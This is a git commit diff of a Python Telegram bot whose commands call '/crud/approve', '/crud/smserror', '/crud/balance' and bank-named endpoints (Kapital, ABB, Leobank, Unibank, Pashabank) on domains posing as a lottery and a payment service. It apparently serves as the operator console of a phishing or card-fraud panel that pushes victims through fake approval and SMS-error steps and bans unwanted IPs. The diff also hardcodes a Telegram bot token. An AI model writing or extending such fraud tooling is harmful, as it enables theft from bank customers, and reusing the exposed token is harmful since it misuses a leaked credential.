9bac1f26a040a70531abf9fea2566669397edbfa
testindsad <dekoderabia@gmail.com>
2023-05-26 20:06:06 -0700

    test

--- main.py
+++ main.py
@@ -13,31 +13,230 @@ BOT_TOKEN = "6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M"
 
 app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-@app.on_message(filters.command(["b"]))
-def kapital(client, message):
-    try:
-        number = message.text.split()[1]
+# @app.on_message(filters.command(["b"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
         
-        url = f"https://m10bonus.net/crud/balance/{number}/"
-        response = requests.get(url)
+#         url = f"https://m10lotereya.biz.net/crud/balance/{number}/"
+#         response = requests.get(url)
 
-        if response.status_code == 200:
-            message.reply_text("Hersey Hazirdir.")
-        else:
-            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
-    except IndexError:
-        message.reply_text("Id Yazin /n command.")
-    except Exception as e:
-        message.reply_text(f"Error: {e}")
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /n command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
         
         
         
-@app.on_message(filters.command(["a"]))
+# @app.on_message(filters.command(["a"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
+        
+#         url = f"https://m10lotereya.biz.net/crud/approve/{number}/"
+#         response = requests.get(url)
+
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /a command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+        
+        
+
+# @app.on_message(filters.command(["e"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
+        
+#         url = f"https://m10lotereya.biz.net/crud/smserror/{number}/"
+#         response = requests.get(url)
+
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /e command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+        
+
+# @app.on_message(filters.command(["k"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
+#         url = f"https://asanodenis.info/crud/kapital/{number}/"
+#         response = requests.get(url)
+
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /kapital command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+        
+# @app.on_message(filters.command(["a"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
+#         url = f"https://asanodenis.info/crud/abb/{number}/"
+#         response = requests.get(url)
+
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /abb command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+        
+        
+# @app.on_message(filters.command(["l"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
+#         url = f"https://asanodenis.info/crud/leobank/{number}/"
+#         response = requests.get(url)
+
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /leobank command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+        
+        
+
+# @app.on_message(filters.command(["u"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
+#         url = f"https://asanodenis.info/crud/unibank/{number}/"
+#         response = requests.get(url)
+
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /unibank command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+        
+# @app.on_message(filters.command(["se"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
+#         url = f"https://asanodenis.info/crud/smserror/{number}"
+#         response = requests.get(url)
+
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /se command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+        
+
+
+# @app.on_message(filters.command(["sf"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
+#         url = f"https://asanodenis.info/crud/smsfix/{number}"
+#         response = requests.get(url)
+
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /smsfix command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+
+
+
+# @app.on_message(filters.command(["p"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
+#         url = f"https://asanodenis.info/crud/pashabank/{number}/"
+#         response = requests.get(url)
+
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /pashabank command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+
+
+
+
+# @app.on_message(filters.command(["error"]))
+# def kapital(client, message):
+#     try:
+#         number = message.text.split()[1]
+#         url = f"https://asanodenis.info/crud/error/{number}/"
+#         response = requests.get(url)
+
+#         if response.status_code == 200:
+#             message.reply_text("Hersey Hazirdir.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Id Yazin /error command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+        
+        
+        
+# @app.on_message(filters.command(["ip"]))
+# def kapital(client, message):
+#     try:
+#         ip = message.text.split()[1]
+#         url = f"https://asanodenis.info/api/banned_ipssadsad1d21dasdasd12dsadsadsad12dqwd12dsad12dsqd12d/"
+#         data = {
+#             "ip_address": f"{ip}",
+#             "ban_reason": ""
+#         }
+#         response = requests.post(url,data=data)
+#         print(response.text)
+#         if response.status_code == 200:
+#             message.reply_text(f"Ip uğurla banladı :)\nip:{ip}.")
+#         else:
+#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
+#     except IndexError:
+#         message.reply_text("Ip Yazin /ip command.")
+#     except Exception as e:
+#         message.reply_text(f"Error: {e}")
+        
+
+       
+@app.on_message(filters.command(["am"]))
 def kapital(client, message):
     try:
         number = message.text.split()[1]
         
-        url = f"https://m10bonus.net/crud/approve/{number}/"
+        url = f"https://m10lotereya.biz.biz/crud/approve/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -51,12 +250,12 @@ def kapital(client, message):
         
         
 
-@app.on_message(filters.command(["e"]))
+@app.on_message(filters.command(["em"]))
 def kapital(client, message):
     try:
         number = message.text.split()[1]
         
-        url = f"https://m10bonus.net/crud/smserror/{number}/"
+        url = f"https://m10lotereya.biz.biz/crud/smserror/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -67,13 +266,12 @@ def kapital(client, message):
         message.reply_text("Id Yazin /e command.")
     except Exception as e:
         message.reply_text(f"Error: {e}")
-        
-
-@app.on_message(filters.command(["k"]))
+@app.on_message(filters.command(["em"]))
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asanodenis.info/crud/kapital/{number}/"
+        
+        url = f"https://m10lotereya.biz.biz/crud/smserror/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -81,15 +279,17 @@ def kapital(client, message):
         else:
             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
     except IndexError:
-        message.reply_text("Id Yazin /kapital command.")
+        message.reply_text("Id Yazin /e command.")
     except Exception as e:
         message.reply_text(f"Error: {e}")
-        
-@app.on_message(filters.command(["a"]))
+
+
+@app.on_message(filters.command(["bm"]))
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://asanodenis.info/crud/abb/{number}/"
+        
+        url = f"https://m10lotereya.biz/crud/balance/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -97,139 +297,12 @@ def kapital(client, message):
         else:
             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
     except IndexError:
-        message.reply_text("Id Yazin /abb command.")
+        message.reply_text("Id Yazin /n command.")
     except Exception as e:
         message.reply_text(f"Error: {e}")
-        
-        
-@app.on_message(filters.command(["l"]))
+
+@app.on_message(filters.command(["help"]))
 def kapital(client, message):
-    try:
-        number = message.text.split()[1]
-        url = f"https://asanodenis.info/crud/leobank/{number}/"
-        response = requests.get(url)
-
-        if response.status_code == 200:
-            message.reply_text("Hersey Hazirdir.")
-        else:
-            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
-    except IndexError:
-        message.reply_text("Id Yazin /leobank command.")
-    except Exception as e:
-        message.reply_text(f"Error: {e}")
-        
-        
-
-@app.on_message(filters.command(["u"]))
-def kapital(client, message):
-    try:
-        number = message.text.split()[1]
-        url = f"https://asanodenis.info/crud/unibank/{number}/"
-        response = requests.get(url)
-
-        if response.status_code == 200:
-            message.reply_text("Hersey Hazirdir.")
-        else:
-            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
-    except IndexError:
-        message.reply_text("Id Yazin /unibank command.")
-    except Exception as e:
-        message.reply_text(f"Error: {e}")
-        
-@app.on_message(filters.command(["se"]))
-def kapital(client, message):
-    try:
-        number = message.text.split()[1]
-        url = f"https://asanodenis.info/crud/smserror/{number}"
-        response = requests.get(url)
-
-        if response.status_code == 200:
-            message.reply_text("Hersey Hazirdir.")
-        else:
-            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
-    except IndexError:
-        message.reply_text("Id Yazin /se command.")
-    except Exception as e:
-        message.reply_text(f"Error: {e}")
-        
-
-
-@app.on_message(filters.command(["sf"]))
-def kapital(client, message):
-    try:
-        number = message.text.split()[1]
-        url = f"https://asanodenis.info/crud/smsfix/{number}"
-        response = requests.get(url)
-
-        if response.status_code == 200:
-            message.reply_text("Hersey Hazirdir.")
-        else:
-            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
-    except IndexError:
-        message.reply_text("Id Yazin /smsfix command.")
-    except Exception as e:
-        message.reply_text(f"Error: {e}")
-
-
-
-@app.on_message(filters.command(["p"]))
-def kapital(client, message):
-    try:
-        number = message.text.split()[1]
-        url = f"https://asanodenis.info/crud/pashabank/{number}/"
-        response = requests.get(url)
-
-        if response.status_code == 200:
-            message.reply_text("Hersey Hazirdir.")
-        else:
-            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
-    except IndexError:
-        message.reply_text("Id Yazin /pashabank command.")
-    except Exception as e:
-        message.reply_text(f"Error: {e}")
-
-
-
-
-@app.on_message(filters.command(["error"]))
-def kapital(client, message):
-    try:
-        number = message.text.split()[1]
-        url = f"https://asanodenis.info/crud/error/{number}/"
-        response = requests.get(url)
-
-        if response.status_code == 200:
-            message.reply_text("Hersey Hazirdir.")
-        else:
-            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
-    except IndexError:
-        message.reply_text("Id Yazin /error command.")
-    except Exception as e:
-        message.reply_text(f"Error: {e}")
-        
-        
-        
-@app.on_message(filters.command(["ip"]))
-def kapital(client, message):
-    try:
-        ip = message.text.split()[1]
-        url = f"https://asanodenis.info/api/banned_ipssadsad1d21dasdasd12dsadsadsad12dqwd12dsad12dsqd12d/"
-        data = {
-            "ip_address": f"{ip}",
-            "ban_reason": ""
-        }
-        response = requests.post(url,data=data)
-        print(response.text)
-        if response.status_code == 200:
-            message.reply_text(f"Ip uğurla banladı :)\nip:{ip}.")
-        else:
-            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
-    except IndexError:
-        message.reply_text("Ip Yazin /ip command.")
-    except Exception as e:
-        message.reply_text(f"Error: {e}")
-        
-
-        
+    message.reply_text("bm - balance error\nam - approve\nem - sms error.")       
 
 app.run()
